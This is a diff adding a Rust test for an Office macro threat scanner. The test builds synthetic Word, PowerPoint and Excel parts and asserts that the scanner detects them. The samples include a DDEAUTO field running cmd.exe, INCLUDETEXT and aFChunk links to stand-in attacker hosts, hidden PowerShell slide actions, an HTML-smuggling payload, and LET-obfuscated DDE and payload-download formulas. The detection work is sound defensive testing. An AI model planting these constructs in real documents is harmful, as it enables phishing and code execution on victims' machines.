@@ -3162,3 +3162,220 @@ fn e2e_rtd_svg_and_signature_threat_inspection() {
         "JSON missing VBA-CELL-022"
     );
 }
+
+#[test]
+fn e2e_word_ppt_altchunk_and_let_threat_inspection() {
+    // 1. Synthesize Word document with field codes (w:fldSimple DDE, complex INCLUDETEXT, MACROBUTTON)
+    let word_doc_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
+  <w:body>
+    <w:p>
+      <w:fldSimple w:instr="DDEAUTO &quot;C:\\Windows\\System32\\cmd.exe&quot; &quot;/k calc.exe&quot;"/>
+    </w:p>
+    <w:p>
+      <w:r><w:fldChar w:fldCharType="begin"/></w:r>
+      <w:r><w:instrText xml:space="preserve"> INCLUDETEXT &quot;http://attacker.com/malicious.docx&quot; </w:instrText></w:r>
+      <w:r><w:fldChar w:fldCharType="end"/></w:r>
+    </w:p>
+    <w:p>
+      <w:r><w:fldChar w:fldCharType="begin"/></w:r>
+      <w:r><w:instrText>MACROBUTTON </w:instrText></w:r>
+      <w:r><w:instrText>AutoOpen </w:instrText></w:r>
+      <w:r><w:instrText>Double Click To Run</w:instrText></w:r>
+      <w:r><w:fldChar w:fldCharType="end"/></w:r>
+    </w:p>
+  </w:body>
+</w:document>"#;
+
+    // 2. Synthesize PowerPoint slide with action settings and mouse-over hover trigger
+    let ppt_slide_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"
+       xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
+       xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+  <p:cSld>
+    <p:spTree>
+      <p:sp>
+        <p:nvSpPr>
+          <p:cNvPr id="2" name="Shape1">
+            <a:hlinkClick r:id="rId1" action="ppaction://program?param=powershell.exe -w hidden"/>
+            <a:hlinkHover r:id="rId2" action="ppaction://program?param=cmd.exe"/>
+          </p:cNvPr>
+        </p:nvSpPr>
+      </p:sp>
+    </p:spTree>
+  </p:cSld>
+</p:sld>"#;
+
+    // 3. Synthesize Word document rels with external aFChunk relationship
+    let word_rels = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rIdAlt" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/aFChunk" Target="http://malicious-server.com/exploit.rtf" TargetMode="External"/>
+</Relationships>"#;
+
+    // 4. Synthesize internal afchunk part containing HTML smuggling payload
+    let afchunk_payload = b"<html><body><script>document.location='data:text/html;base64,TVqQAAMAAAAEAAAA...'</script></body></html>";
+
+    // 5. Synthesize Excel worksheet with LET and ENCODEURL formula de-obfuscation
+    let sheet_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+  <sheetData>
+    <row r="1">
+      <c r="A1" t="str">
+        <f>LET(p1, "cmd", p2, ".exe|'/c calc'!A0", CONCAT(p1, p2))</f>
+        <v>cmd.exe|'/c calc'!A0</v>
+      </c>
+      <c r="B1" t="str">
+        <f>LET(u, "https://evil.com/payload.exe", ENCODEURL(u))</f>
+        <v>https%3A%2F%2Fevil.com%2Fpayload.exe</v>
+      </c>
+    </row>
+  </sheetData>
+</worksheet>"#;
+
+    let workbook_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
+          xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+  <sheets>
+    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
+  </sheets>
+</workbook>"#;
+
+    let content_types = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+  <Default Extension="xml" ContentType="application/xml"/>
+  <Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
+  <Default Extension="dat" ContentType="application/octet-stream"/>
+  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/>
+  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
+</Types>"#;
+
+    let root_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
+</Relationships>"#;
+
+    let wb_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
+  <Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
+</Relationships>"#;
+
+    let project_bytes = synthesize_cfb_project(
+        "VBAProject",
+        &[("Module1", "Sub AutoOpen()\nEnd Sub\n", &[])],
+        &[],
+    );
+
+    let entries: Vec<(&str, &[u8])> = vec![
+        ("[Content_Types].xml", content_types.as_bytes()),
+        ("_rels/.rels", root_rels.as_bytes()),
+        ("xl/_rels/workbook.xml.rels", wb_rels.as_bytes()),
+        ("word/document.xml", word_doc_xml),
+        ("word/_rels/document.xml.rels", word_rels),
+        ("word/afchunk1.dat", afchunk_payload),
+        ("ppt/slides/slide1.xml", ppt_slide_xml),
+        ("xl/worksheets/sheet1.xml", sheet_xml),
+        ("xl/workbook.xml", workbook_xml),
+        ("xl/vbaProject.bin", &project_bytes),
+    ];
+
+    let zip_bytes = synthesize_zip(&entries);
+    let options = AnalysisOptions {
+        limits: Limits::default(),
+        host_profile: HostProfile::Excel,
+        ..Default::default()
+    };
+
+    let inspection = inspect_macro_file(&zip_bytes, &options).expect("Inspection should succeed");
+    let threats = &inspection.extracted.cell_threats;
+
+    // 1. Verify WordFieldCode (VBA-CELL-023)
+    assert!(
+        threats.iter().any(|t| t.threat_kind == "WordFieldCode"
+            && t.severity == "Critical"
+            && t.description.contains("DDEAUTO")),
+        "Should detect Word DDEAUTO field code: {threats:?}"
+    );
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "WordFieldCode" && t.description.contains("INCLUDETEXT")),
+        "Should detect Word INCLUDETEXT field code: {threats:?}"
+    );
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "WordFieldCode" && t.description.contains("MACROBUTTON")),
+        "Should detect Word MACROBUTTON field code: {threats:?}"
+    );
+
+    // 2. Verify PowerPointSlideAction (VBA-CELL-024)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "PowerPointSlideAction"
+                && t.coordinate == "part:ppt/slides/slide1.xml:action:ProgramLaunch"),
+        "Should detect PowerPoint program launch action: {threats:?}"
+    );
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "PowerPointSlideAction"
+                && t.coordinate == "part:ppt/slides/slide1.xml:action:MouseHoverTrigger"),
+        "Should detect PowerPoint mouse-over hover trigger: {threats:?}"
+    );
+
+    // 3. Verify SuspiciousAltChunk (VBA-CELL-025)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "SuspiciousAltChunk" && t.coordinate.contains("rIdAlt")),
+        "Should detect external AltChunk relationship: {threats:?}"
+    );
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "SuspiciousAltChunk"
+                && t.coordinate == "part:word/afchunk1.dat"),
+        "Should detect internal AltChunk HTML smuggling payload: {threats:?}"
+    );
+
+    // 4. Verify Cell A1 resolves DDE via LET formula de-obfuscation
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "A1"
+            && t.threat_kind == "DDE"
+            && t.description.contains("cmd.exe|'/c calc'!A0")),
+        "Cell A1 should resolve DDE through LET evaluation: {threats:?}"
+    );
+
+    // 5. Verify SARIF rules VBA-CELL-023, VBA-CELL-024, VBA-CELL-025
+    let sarif = inspection_to_sarif(&inspection, "file:///test/word_ppt_altchunk.docm");
+    assert!(
+        sarif.contains("VBA-CELL-023"),
+        "SARIF must contain VBA-CELL-023 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-024"),
+        "SARIF must contain VBA-CELL-024 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-025"),
+        "SARIF must contain VBA-CELL-025 rule"
+    );
+
+    // 6. Verify JSON output contains rule_id VBA-CELL-023, VBA-CELL-024, VBA-CELL-025
+    let json = inspect_to_json(&inspection, Disclosure::IncludeSource);
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-023\""),
+        "JSON missing VBA-CELL-023"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-024\""),
+        "JSON missing VBA-CELL-024"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-025\""),
+        "JSON missing VBA-CELL-025"
+    );
+}
